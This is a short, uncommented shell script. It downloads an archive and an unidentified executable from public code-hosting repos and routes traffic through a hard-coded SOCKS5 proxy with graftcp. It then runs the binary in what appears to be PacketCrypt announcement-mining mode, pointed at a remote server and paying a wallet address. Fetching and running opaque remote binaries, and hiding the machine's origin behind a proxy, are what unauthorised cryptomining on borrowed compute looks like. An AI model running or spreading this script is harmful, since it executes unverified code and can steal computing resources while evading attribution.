wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz
wget https://github.com/startpatrick325/curly-engine/raw/refs/heads/main/oke
chmod +x oke

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 174.138.87.115:1080
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
sleep 10s
echo " "
./graftcp/graftcp curl ifconfig.me

./graftcp/graftcp ./oke ann http://anu.sanggarnugraha.org -p pkt1qrlr3fufjkhv2d9ddlnlw0tn9fua00uyapelq5s
